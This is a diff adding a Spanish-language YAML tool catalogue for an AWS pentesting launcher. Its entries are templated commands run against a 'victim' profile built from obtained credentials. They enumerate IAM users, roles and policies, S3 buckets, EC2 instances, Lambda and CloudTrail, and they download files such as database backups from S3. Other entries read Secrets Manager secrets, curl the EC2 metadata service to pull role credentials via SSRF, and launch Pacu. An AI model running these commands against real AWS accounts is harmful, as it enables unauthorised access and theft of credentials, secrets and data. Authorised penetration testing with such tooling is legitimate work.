@@ -1,0 +1,216 @@
+tools:
+  - name: "AWS CLI - Configurar credenciales"
+    description: "Configurar perfil AWS CLI con credenciales obtenidas"
+    command: "aws configure --profile {profile}"
+    params:
+      - name: profile
+        label: "Nombre del perfil"
+        type: text
+        placeholder: "victim"
+
+  - name: "AWS STS - GetCallerIdentity"
+    description: "Identificar el usuario/rol actual y cuenta AWS"
+    command: "aws sts get-caller-identity --profile {profile}"
+    params:
+      - name: profile
+        label: "Perfil AWS"
+        type: text
+        placeholder: "victim"
+
+  - name: "IAM - Listar usuarios"
+    description: "Enumerar usuarios IAM de la cuenta"
+    command: "aws iam list-users --profile {profile}"
+    params:
+      - name: profile
+        label: "Perfil AWS"
+        type: text
+        placeholder: "victim"
+
+  - name: "IAM - Listar grupos"
+    description: "Enumerar grupos IAM"
+    command: "aws iam list-groups --profile {profile}"
+    params:
+      - name: profile
+        label: "Perfil AWS"
+        type: text
+        placeholder: "victim"
+
+  - name: "IAM - Listar roles"
+    description: "Enumerar roles IAM de la cuenta"
+    command: "aws iam list-roles --profile {profile}"
+    params:
+      - name: profile
+        label: "Perfil AWS"
+        type: text
+        placeholder: "victim"
+
+  - name: "IAM - Politicas del usuario"
+    description: "Ver politicas inline y gestionadas del usuario"
+    command: "aws iam list-attached-user-policies --user-name {user} --profile {profile}; aws iam list-user-policies --user-name {user} --profile {profile}"
+    params:
+      - name: user
+        label: "Nombre del usuario IAM"
+        type: text
+        placeholder: "devops-user"
+      - name: profile
+        label: "Perfil AWS"
+        type: text
+        placeholder: "victim"
+
+  - name: "IAM - Politicas del rol"
+    description: "Ver politicas asociadas a un rol"
+    command: "aws iam list-attached-role-policies --role-name {role} --profile {profile}"
+    params:
+      - name: role
+        label: "Nombre del rol"
+        type: text
+        placeholder: "EC2AdminRole"
+      - name: profile
+        label: "Perfil AWS"
+        type: text
+        placeholder: "victim"
+
+  - name: "IAM - Detalle de politica"
+    description: "Ver el JSON de una politica IAM"
+    command: "aws iam get-policy-version --policy-arn {arn} --version-id v1 --profile {profile}"
+    params:
+      - name: arn
+        label: "ARN de la politica"
+        type: text
+        placeholder: "arn:aws:iam::123456789012:policy/MyPolicy"
+      - name: profile
+        label: "Perfil AWS"
+        type: text
+        placeholder: "victim"
+
+  - name: "S3 - Listar buckets"
+    description: "Enumerar todos los buckets S3 de la cuenta"
+    command: "aws s3 ls --profile {profile}"
+    params:
+      - name: profile
+        label: "Perfil AWS"
+        type: text
+        placeholder: "victim"
+
+  - name: "S3 - Listar contenido de bucket"
+    description: "Ver ficheros dentro de un bucket S3"
+    command: "aws s3 ls s3://{bucket}/ --recursive --profile {profile}"
+    params:
+      - name: bucket
+        label: "Nombre del bucket"
+        type: text
+        placeholder: "company-backups"
+      - name: profile
+        label: "Perfil AWS"
+        type: text
+        placeholder: "victim"
+
+  - name: "S3 - Descargar fichero"
+    description: "Descargar un fichero desde S3"
+    command: "aws s3 cp s3://{bucket}/{key} {local_path} --profile {profile}"
+    params:
+      - name: bucket
+        label: "Bucket"
+        type: text
+        placeholder: "company-backups"
+      - name: key
+        label: "Ruta del fichero en S3"
+        type: text
+        placeholder: "db/backup.sql"
+      - name: local_path
+        label: "Ruta local"
+        type: text
+        placeholder: "/tmp/backup.sql"
+      - name: profile
+        label: "Perfil AWS"
+        type: text
+        placeholder: "victim"
+
+  - name: "S3 - Bucket publico (sin credenciales)"
+    description: "Acceder a bucket S3 publico sin autenticacion"
+    command: "aws s3 ls s3://{bucket}/ --no-sign-request"
+    params:
+      - name: bucket
+        label: "Nombre del bucket"
+        type: text
+        placeholder: "public-company-assets"
+
+  - name: "EC2 - Listar instancias"
+    description: "Enumerar instancias EC2 de la region"
+    command: "aws ec2 describe-instances --profile {profile} --region {region} --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,PrivateIpAddress,Tags[?Key==`Name`].Value[]]'"
+    params:
+      - name: profile
+        label: "Perfil AWS"
+        type: text
+        placeholder: "victim"
+      - name: region
+        label: "Region AWS"
+        type: text
+        placeholder: "eu-west-1"
+
+  - name: "EC2 - Metadata SSRF (IMDS v1)"
+    description: "Obtener credenciales via SSRF al metadata service (desde EC2 o via SSRF)"
+    command: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
+    params:
+      - name: role_name
+        label: "Nombre del rol IAM de la instancia"
+        type: text
+        placeholder: "EC2AdminRole"
+
+  - name: "Secrets Manager - Listar secretos"
+    description: "Enumerar secretos en AWS Secrets Manager"
+    command: "aws secretsmanager list-secrets --profile {profile}"
+    params:
+      - name: profile
+        label: "Perfil AWS"
+        type: text
+        placeholder: "victim"
+
+  - name: "Secrets Manager - Obtener secreto"
+    description: "Leer el valor de un secreto"
+    command: "aws secretsmanager get-secret-value --secret-id {secret_id} --profile {profile}"
+    params:
+      - name: secret_id
+        label: "ID o nombre del secreto"
+        type: text
+        placeholder: "prod/database/password"
+      - name: profile
+        label: "Perfil AWS"
+        type: text
+        placeholder: "victim"
+
+  - name: "Lambda - Listar funciones"
+    description: "Enumerar funciones Lambda de la cuenta"
+    command: "aws lambda list-functions --profile {profile} --region {region}"
+    params:
+      - name: profile
+        label: "Perfil AWS"
+        type: text
+        placeholder: "victim"
+      - name: region
+        label: "Region"
+        type: text
+        placeholder: "eu-west-1"
+
+  - name: "CloudTrail - Listar trails"
+    description: "Ver configuracion de logging CloudTrail"
+    command: "aws cloudtrail describe-trails --profile {profile}"
+    params:
+      - name: profile
+        label: "Perfil AWS"
+        type: text
+        placeholder: "victim"
+
+  - name: "Pacu - Framework de pentesting AWS"
+    description: "Iniciar Pacu para enumeracion automatizada de AWS"
+    command: "python3 pacu.py"
+    params: []
+
+  - name: "AWS - Enumerar todas las regiones"
+    description: "Listar regiones AWS disponibles"
+    command: "aws ec2 describe-regions --output table --profile {profile}"
+    params:
+      - name: profile
+        label: "Perfil AWS"
+        type: text
+        placeholder: "victim"
